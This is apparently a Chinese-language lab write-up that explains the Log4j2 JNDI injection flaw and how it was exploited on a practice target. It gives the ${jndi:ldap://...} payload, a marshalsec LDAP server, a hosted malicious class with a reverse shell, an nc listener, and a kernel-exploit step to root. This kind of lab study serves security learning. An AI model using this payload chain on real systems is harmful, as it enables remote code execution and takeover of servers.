### **<span style="color:#3498db">原理：日志里的 ${} 是个"执行开关"</span>**

Log4j2 是 Java 最常用的日志库。它有个"解析外部变量"的便利功能：**日志内容里出现 `${关键词:内容}` 会被展开**：

- `${sys:xxx}` → 查系统变量
- `${env:xxx}` → 查环境变量
- **`${jndi:xxx}` → 走 JNDI 协议去查资源** ← 危险就在这

于是攻击思路非常清晰：**只要我们的输入会被写进日志**（登录用户名、User-Agent、各种字段都算），就把 `${jndi:ldap://攻击机:1389/Exp}` 塞进去。服务端打印日志时触发 JNDI 解析——**后面就和上一篇 JNDI 一模一样**：LDAP 返回 reference → JVM 去我们的 HTTP 服务器加载恶意 class → 静态代码块执行 → 反弹 shell。

### **<span style="color:#3498db">三步走（复用 JNDI 套件）</span>**

1. 恶意类 `Exp.class`：静态代码块里放反弹 shell，`javac -target 1.8 -source 1.8` 降级编译；
2. **marshalsec 起恶意 LDAP 服务**，返回指向 `http://10.10.1.186:8080/#Exp` 的 reference；
3. `python3 -m http.server 8080` 托管恶意类，`nc -lvnp 4444` 等着。

### **<span style="color:#3498db">提权</span>**

翻了一遍提权面没什么发现，看内核——和昨天那台一样，是同一个还没打补丁的 6.8.0 系列，同款内核 EXP 编译运行：

```bash
chmod +x ./exp && ./exp
```

![mm](/assets/img/2025-07-24-15-07-57.png)
![mm](/assets/img/2025-07-24-15-07-27.png)

root 到手。两台 Java 靶场连着打，**JNDI 这条链（恶意类 + LDAP + HTTP）已经可以背下来了**：Shiro 用它解反序列化、Log4j2 用它解析日志、fastjson 用它碰 `@type`——**同一个终点，不同的入口**。
